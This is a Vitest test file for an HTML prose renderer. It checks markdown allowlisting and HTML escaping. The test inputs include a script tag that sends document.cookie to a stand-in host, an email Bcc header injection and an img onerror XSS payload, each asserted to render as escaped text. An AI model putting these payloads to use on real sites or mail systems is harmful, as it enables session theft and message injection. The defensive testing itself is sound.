import { describe, expect, it } from 'vitest';

import {
  PROSE_TOKEN_TYPES,
  escapeHtml,
  parseProse,
  parseProseInlines,
  renderProseHtml,
  renderProseText,
} from '@compass/renderers';

/**
 * Subtask 004's renderer criteria: markdown by allowlist, raw HTML escaped.
 *
 * The payloads here are the ones the criterion names — a script tag and an
 * email-header injection — and they are asserted to come out as *literal text*
 * rather than as nothing. Stripping them would be the wrong fix: "the ticket is
 * called that" is a fact about a manager's board, and a report that silently
 * deleted the title would be hiding the thing the manager most needs to see.
 */

const SCRIPT_TAG = '<script>fetch("https://evil.test/"+document.cookie)</script>';
const HEADER_INJECTION = 'Subject: fine\r\nBcc: attacker@evil.test';

describe('the allowlist is closed', () => {
  it('declares exactly four token types', () => {
    expect([...PROSE_TOKEN_TYPES]).toEqual(['text', 'emphasis', 'strong', 'code']);
  });

  it('recognises the three inline forms the renderers emit', () => {
    expect(parseProseInlines('a *b* **c** `d`')).toEqual([
      { type: 'text', text: 'a ' },
      { type: 'emphasis', text: 'b' },
      { type: 'text', text: ' ' },
      { type: 'strong', text: 'c' },
      { type: 'text', text: ' ' },
      { type: 'code', text: 'd' },
    ]);
  });

  it('prefers strong over emphasis when both could match', () => {
    expect(parseProseInlines('**Priya Raman**')).toEqual([{ type: 'strong', text: 'Priya Raman' }]);
  });

  it('does not treat an underscore as a marker', () => {
    // `feature/PLAT-742_batch` and `snake_case` are real identifiers. Reading the
    // underscores as formatting would eat characters out of a key a manager is
    // trying to match against their board.
    expect(parseProseInlines('feature/PLAT-742_batch_writer')).toEqual([
      { type: 'text', text: 'feature/PLAT-742_batch_writer' },
    ]);
  });

  it('leaves an unclosed marker as a literal character', () => {
    expect(parseProseInlines('2 * 3 is 6')).toEqual([{ type: 'text', text: '2 * 3 is 6' }]);
    expect(parseProseInlines('a `b')).toEqual([{ type: 'text', text: 'a `b' }]);
  });

  it('leaves an empty marker pair as literal characters', () => {
    expect(parseProseInlines('a ** b')).toEqual([{ type: 'text', text: 'a ** b' }]);
  });

  it('recognises no heading, list, table, link or image', () => {
    // Every one of these is structure, and the Six Spine owns the document's
    // structure. Prose does not get to add to it.
    for (const attempt of [
      '# Heading',
      '## Heading',
      '- a list item',
      '1. an ordered item',
      '| a | table |',
      '[a link](https://evil.test)',
      '![an image](https://evil.test/x.png)',
      '> a blockquote',
    ]) {
      const inlines = parseProseInlines(attempt);
      expect(inlines, `\`${attempt}\` was parsed as something other than text`).toEqual([
        { type: 'text', text: attempt },
      ]);
    }
  });
});

describe('paragraphs', () => {
  it('splits on the blank line every renderer writes', () => {
    expect(parseProse('one\n\ntwo\n\nthree')).toHaveLength(3);
  });

  it('folds a single newline into a space', () => {
    expect(parseProse('one\ntwo')).toEqual([{ inlines: [{ type: 'text', text: 'one two' }] }]);
  });

  it('drops blank paragraphs rather than rendering empty ones', () => {
    expect(parseProse('one\n\n\n\n   \n\ntwo')).toHaveLength(2);
  });

  it('returns nothing for empty prose', () => {
    expect(parseProse('   \n  ')).toEqual([]);
  });
});

describe('raw HTML is never markup', () => {
  it('parses a script tag as literal text', () => {
    expect(parseProseInlines(`DEV-501 — ${SCRIPT_TAG}`)).toEqual([
      { type: 'text', text: `DEV-501 — ${SCRIPT_TAG}` },
    ]);
  });

  it('escapes every one of the five dangerous characters', () => {
    expect(escapeHtml(`<>&"'`)).toBe('&lt;&gt;&amp;&quot;&#39;');
  });

  it('escapes the ampersand once, not twice', () => {
    // A two-pass implementation that escaped `<` and then `&` would produce
    // `&amp;lt;` and print the entity instead of the character.
    expect(escapeHtml('<')).toBe('&lt;');
    expect(escapeHtml('&lt;')).toBe('&amp;lt;');
  });

  it('renders a script tag as an escaped entity in the HTML form', () => {
    const html = renderProseHtml(`A ticket titled ${SCRIPT_TAG} was flagged.`);

    expect(html).not.toContain('<script');
    expect(html).toContain('&lt;script&gt;');
    // The characters survive, so the report can still say what the ticket is called.
    expect(html).toContain('document.cookie');
    // Exactly one paragraph element, and it is a `p` — nothing the payload asked for.
    expect(html.match(/<[a-z]+/g)).toEqual(['<p']);
  });

  it('renders an email-header injection as one line of literal text', () => {
    const html = renderProseHtml(`A ticket titled ${HEADER_INJECTION} was flagged.`);

    // The CR/LF is folded into the paragraph rather than surviving as a break that a
    // header assembler downstream could act on.
    expect(html).not.toContain('\r');
    expect(html).toContain('Bcc: attacker@evil.test');
    expect(html.match(/<[a-z]+/g)).toEqual(['<p']);
  });

  it('emits no tag a payload asked for, even when the payload is only a tag', () => {
    expect(renderProseHtml('<img src=x onerror=alert(1)>')).toBe(
      '<p>&lt;img src=x onerror=alert(1)&gt;</p>',
    );
  });

  it('escapes an attacker-supplied quote so it cannot break out of an attribute', () => {
    expect(renderProseHtml('a " b')).toBe('<p>a &quot; b</p>');
  });
});

describe('the plain-text form', () => {
  it('drops the markers and keeps the words', () => {
    expect(renderProseText('**Priya Raman** merged *it* in `#883`.')).toBe('Priya Raman merged it in #883.');
  });

  it('keeps a script tag as literal characters', () => {
    expect(renderProseText(SCRIPT_TAG)).toBe(SCRIPT_TAG);
  });

  it('separates paragraphs with a blank line', () => {
    expect(renderProseText('one\n\ntwo')).toBe('one\n\ntwo');
  });
});

describe('the two forms agree about the words', () => {
  it('renders the same visible text either way', () => {
    const prose = `**Priya Raman** flagged *${SCRIPT_TAG}* under \`CHK-701\`.`;
    const html = renderProseHtml(prose);
    const text = renderProseText(prose);

    // Strip the tags and unescape, and the HTML form says exactly what the text form
    // says. A sanitizer that dropped content in one channel and not the other is the
    // failure this asserts against.
    const visible = html
      .replace(/<\/?(?:p|em|strong|code)>/g, '')
      .replaceAll('&lt;', '<')
      .replaceAll('&gt;', '>')
      .replaceAll('&quot;', '"')
      .replaceAll('&#39;', "'")
      .replaceAll('&amp;', '&');

    expect(visible).toBe(text);
  });
});
